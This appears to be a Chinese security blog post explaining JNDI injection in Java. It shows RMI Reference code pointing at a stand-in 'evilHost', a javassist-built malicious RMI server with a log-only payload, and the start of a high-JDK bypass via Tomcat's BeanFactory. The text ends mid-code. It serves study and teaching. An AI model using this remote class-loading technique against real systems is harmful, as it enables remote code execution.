<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>JNDI注入浅析 | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>JNDI注入浅析</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-01-10T16:00:00.000Z" id="date"> 2023-01-11</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-01-12T09:20:41.270Z" id="updated"> 2023-01-12</time></div></span></div></div><hr><div id="post-content"><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>最近打算系统化梳理一下JAVA安全的知识点，本节知识点为JNDI，之前看了好多篇还并不是完全明白，这次再看加深印象。并且想自己动手写一个JNDI-Exploit，锻炼自己的工程化代码能力</p>
<h4 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h4><p>全称：JAVA命名和目录接口（Java Naming and Directory Interface），通过调用JNDI的API可以定位资源和其他程序对象。现有可访问的目录和服务有<code>JDBC LDAP RMI DNS NIS CORBA</code></p>
<h4 id="命名-gt-Naming-Service"><a href="#命名-gt-Naming-Service" class="headerlink" title="命名 =&gt; Naming Service"></a>命名 =&gt; Naming Service</h4><p>命名服务主要是将名称和对象相关联，这里的对象并不是实体，而是对象的引用，其中包含着如何去访问对象的信息。</p>
<p>名称系统的几个重要概念</p>
<blockquote>
<p><code>Bindings</code>: 表示一个名称和对应对象的绑定关系<br><code>Context</code>:一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象<code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。</p>
</blockquote>
<h4 id="目录-gt-Directory-Service"><a href="#目录-gt-Directory-Service" class="headerlink" title="目录 =&gt; Directory Service"></a>目录 =&gt; Directory Service</h4><p>目录服务是命名服务的扩展，它允许对象还可以具有属性。提供在目录中进行CRUD对象操作</p>
<p>由此，我们可以通过两种方式使用JNDI：</p>
<ol>
<li>常规方式使用名称服务</li>
<li>使用目录服务作为对象存储的系统，即用目录服务来存储和获取Java对象</li>
</ol>
<p>我们可以通过统一的API来访问不同的目录服务实现，架构如下：</p>
<p>其中的API分为<strong>应用层接口</strong>和<strong>SPI</strong></p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107183720435.png'><img src="/2023/01/11/JNDI/image-20230107183720435.png" alt="image-20230107183720435"></p>
<blockquote>
<p><code>SPI</code> 全称为 <code>Service Provider Interface</code>，即服务供应接口，主要作用是为<strong>底层的具体目录服务</strong>提供统一接口，从而实现目录服务的可插拔式安装</p>
</blockquote>
<h4 id="一些需要的类"><a href="#一些需要的类" class="headerlink" title="一些需要的类"></a>一些需要的类</h4><ul>
<li><p><code>InitialContext</code></p>
<p>构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构建一个初始上下文。</span><br>InitialContext() <br><span class="hljs-comment">//构造一个初始上下文，并选择不初始化它。</span><br>InitialContext(<span class="hljs-type">boolean</span> lazy) <br><span class="hljs-comment">//使用提供的环境构建初始上下文。</span><br>InitialContext(Hashtable&lt;?,?&gt; environment) <br></code></pre></td></tr></table></figure>
<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将名称绑定到对象。 </span><br>bind(Name name, Object obj) <br><span class="hljs-comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br>list(String name) <br><span class="hljs-comment">//检索命名对象。</span><br>lookup(String name)  <br><span class="hljs-comment">//将名称绑定到对象，覆盖任何现有绑定。</span><br>rebind(String name, Object obj) <br><span class="hljs-comment">//取消绑定命名对象。</span><br>unbind(String name)  <br></code></pre></td></tr></table></figure>
</li>
<li><p><code>Reference</code></p>
<p>对象的引用类</p>
<p>构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//为类名为“className”的对象构造一个新的引用。</span><br>Reference(String className) <br><span class="hljs-comment">//为类名为“className”的对象和地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr) <br><span class="hljs-comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br>Reference(String className, RefAddr addr, String factory, String factoryLocation) <br><span class="hljs-comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br>Reference(String className, String factory, String factoryLocation)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">参数：</span><br><span class="hljs-comment">className 远程加载时所使用的类名</span><br><span class="hljs-comment">factory  加载的class中需要实例化类的名称</span><br><span class="hljs-comment">factoryLocation  提供classes数据的地址可以是file/ftp/http协议</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将地址添加到索引posn的地址列表中。</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> <br><span class="hljs-comment">//将地址添加到地址列表的末尾。 </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> <br><span class="hljs-comment">//从此引用中删除所有地址。  </span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索索引posn上的地址。 </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索地址类型为“addrType”的第一个地址。  </span><br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> <br><span class="hljs-comment">//检索本参考文献中地址的列举。 </span><br>Enumeration&lt;RefAddr&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索引用引用的对象的类名。 </span><br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用的对象的工厂位置。  </span><br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//检索此引用引用对象的工厂的类名。  </span><br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//从地址列表中删除索引posn上的地址。    </span><br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> <br><span class="hljs-comment">//检索此引用中的地址数。 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> <br><span class="hljs-comment">//生成此引用的字符串表示形式。</span><br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> <br></code></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="JNDI-Reference-注入"><a href="#JNDI-Reference-注入" class="headerlink" title="JNDI Reference 注入"></a>JNDI Reference 注入</h4><p>  前因：为了避免每次在命名服务绑定Java对象时都需要序列化大数据并传输，因此改为换成对象引用的方式。</p>
<blockquote>
<p>对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。</p>
</blockquote>
<p>  引用由Reference来表示，里面包括一个RefAddress地址有序列表和所引用的对象信息，包括类名、创建对象的ObjectFactory类的名称和地址</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107191026654.png'><img src="/2023/01/11/JNDI/image-20230107191026654.png" alt="image-20230107191026654"></p>
<blockquote>
<p><code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<strong><code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象</strong>。</p>
</blockquote>
<p>  这也是JNDI的利用原理，当lookup参数可控时，便可向指定位置加载恶意对象</p>
<p>  具体流程如下，这里以RMI服务为例</p>
<p>  首先服务端绑定引用到注册中心，并且该引用对象中工厂类位置为恶意class所在位置</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> );     registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure>
<p>  客户端通过rmi协议发起请求，即可造成恶意文件，实例化类时造成RCE</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure>
<h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h4><ul>
<li><p>低版本JDK</p>
<p>Evil Server 顺便练了一下javassit生成字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        makeEvilClass();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">factoryUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:1098/&quot;</span>;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClass&quot;</span>, factoryUrl);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;Foo&quot;</span>, wrapper);<br><br>        System.out.println(<span class="hljs-string">&quot;Server ready, factoryUrl:&quot;</span> + factoryUrl);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;EvilClass&quot;</span>);<br>        cc.setInterfaces(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123; pool.get(<span class="hljs-string">&quot;javax.naming.spi.ObjectFactory&quot;</span>) &#125;);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;try&#123;System.out.println(\&quot;EvilClass: \&quot; + $1);&#125; catch(Exception e)&#123;&#125;&#125;&quot;</span>;<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(CtClass.voidType, <span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, cc);<br>        ctMethod.setModifiers(Modifier.STATIC);<br>        ctMethod.setBody(code);<br>        cc.addMethod(ctMethod);<br><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, cc);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;EvilClass.log(\&quot;constructor\&quot;);&#125;&quot;</span>);<br>        cc.addConstructor(cons);<br><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">staticCode</span> <span class="hljs-operator">=</span> cc.makeClassInitializer();<br>        staticCode.setBody(<span class="hljs-string">&quot;&#123;EvilClass.log(\&quot;static block\&quot;);&#125;&quot;</span>);<br><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;java.lang.Object&quot;</span>);<br>        CtClass[] parameters = &#123;pool.get(<span class="hljs-string">&quot;java.lang.Object&quot;</span>), pool.get(<span class="hljs-string">&quot;javax.naming.Name&quot;</span>), pool.get(<span class="hljs-string">&quot;javax.naming.Context&quot;</span>)&#125;;<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtMethod</span>(returnType, <span class="hljs-string">&quot;getObjectInstance&quot;</span>, parameters, cc);<br>        ctMethod1.addParameter(pool.get(<span class="hljs-string">&quot;java.util.Hashtable&quot;</span>));<br>        ctMethod1.setBody(<span class="hljs-string">&quot;&#123;EvilClass.log(\&quot;getObjectInstance\&quot;); return null;&#125;&quot;</span>);<br>        cc.addMethod(ctMethod1);<br><br>        cc.writeFile(<span class="hljs-string">&quot;D:\\ctf\\JNDI\\src\\main\\java\\&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>生成的class文件如下</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107220136290.png'><img src="/2023/01/11/JNDI/image-20230107220136290.png" alt="image-20230107220136290"></p>
</li>
</ul>
<p>Client：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Foo&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;ret&quot;</span> + ret);<br>        &#125;<span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>服务端启动恶意服务器，客户端运行</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107220218096.png'><img src="/2023/01/11/JNDI/image-20230107220218096.png" alt="image-20230107220218096"></p>
<p><strong>各个代码块执行顺序</strong>：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">static在类加载的时候执行<br>代码块和无参构造方法在clas.newInstance()时执行<br></code></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>高版本JDK限制</p>
<p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code></p>
<p>如果想要直接运行，如要添加参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-D com.sun.jndi.rmi.object.trustURLCodebase=true<br></code></pre></td></tr></table></figure>
<p>看下报错：</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107220756804.png'><img src="/2023/01/11/JNDI/image-20230107220756804.png" alt="image-20230107220756804"></p>
<p>可以看到在<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>方法中，由于高版本trustURLCodebase默认为false，进入分支抛出异常</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107221223488.png'><img src="/2023/01/11/JNDI/image-20230107221223488.png" alt="image-20230107221223488"></p>
</li>
<li><p>高版本JDK绕过</p>
<p>绕过方式可以针对条件句的三个子句尝试进行利用</p>
<ul>
<li><p>令var8也就是<code>ref</code>为空，需要让其既不是<code>Reference</code>类也不是<code>Referenceable</code>类，那么就只能直接用原始对象了，在RMI下不好利用</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107221541609.png'><img src="/2023/01/11/JNDI/image-20230107221541609.png" alt="image-20230107221541609"></p>
</li>
<li><p>令<code>ref.getFactoryClassLocation()</code>返回空值，也就是设置ref的<code>classFactoryLocation</code>属性为空，客户端不再从远程加载class字节码</p>
</li>
<li><p>第三项就是正常设置参数</p>
</li>
</ul>
<p>如果按照第二个思路来的话，下一个执行为<code>NamingManager.getObjectInstance()</code>，我们跟进。</p>
<p>这里会发现，如果<code>ref</code>不为空的话，先获取到工厂类名然后会直接尝试实例化工厂类，如果不为null将会进一步调用工厂类的<code>getObjectInstance()</code>方法</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230107222946308.png'><img src="/2023/01/11/JNDI/image-20230107222946308.png" alt="image-20230107222946308"></p>
<p>按照之前实验的客户端在lookup后的代码块执行顺序，我们只要能在这几个地方其中一个触发payload就行了</p>
<p>调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">InitialContext#lookup()<br>  RegistryContext#lookup()<br>    RegistryContext#decodeObject()<br>      NamingManager#getObjectInstance()<br>          objectfactory = NamingManager#getObjectFactoryFromReference()<br>                  Class#newInstance()  //--&gt;恶意代码被执行<br>     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行<br></code></pre></td></tr></table></figure>
<p><strong>条件</strong>：</p>
<blockquote>
<ul>
<li><p>存在于目标本地的 <code>CLASSPATH</code> 中 </p>
</li>
<li><p>实现 <code>javax.naming.spi.ObjectFactory</code> 接口 </p>
</li>
<li>至少存在一个 <code>getObjectInstance()</code> 方法</li>
</ul>
</blockquote>
<p><strong>利用：</strong>Tomcat内置类</p>
<p>依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>看下 <code>org.apache.naming.factory.BeanFactory#getObjectInstance()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx,</span><br><span class="hljs-params">                                Hashtable&lt;?,?&gt; environment)</span><br>    <span class="hljs-keyword">throws</span> NamingException &#123;<br><br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (Reference) obj;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">beanClassName</span> <span class="hljs-operator">=</span> ref.getClassName();<br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">tcl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-comment">// 1. 反射获取类对象</span><br>    <span class="hljs-keyword">if</span> (tcl != <span class="hljs-literal">null</span>) &#123;<br>        beanClass = tcl.loadClass(beanClassName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        beanClass = Class.forName(beanClassName);<br>    &#125;<br>    <span class="hljs-comment">// 2. 初始化类实例</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> beanClass.getConstructor().newInstance();<br><br>    <span class="hljs-comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span><br>    <span class="hljs-type">RefAddr</span> <span class="hljs-variable">ra</span> <span class="hljs-operator">=</span> ref.get(<span class="hljs-string">&quot;forceString&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String)ra.getContent();<br><br>    <span class="hljs-comment">// 4. 循环解析别名并保存到字典中</span><br>    <span class="hljs-keyword">for</span> (String param: value.split(<span class="hljs-string">&quot;,&quot;</span>)) &#123;<br>        param = param.trim();<br>        index = param.indexOf(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            setterName = param.substring(index + <span class="hljs-number">1</span>).trim();<br>            param = param.substring(<span class="hljs-number">0</span>, index).trim();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setterName = <span class="hljs-string">&quot;set&quot;</span> +<br>                param.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>).toUpperCase(Locale.ENGLISH) +<br>                param.substring(<span class="hljs-number">1</span>);<br>        &#125;<br>        forced.put(param, beanClass.getMethod(setterName, paramTypes));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span><br>    Enumeration&lt;RefAddr&gt; e = ref.getAll();<br>    <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;<br>        ra = e.nextElement();<br>        <span class="hljs-type">String</span> <span 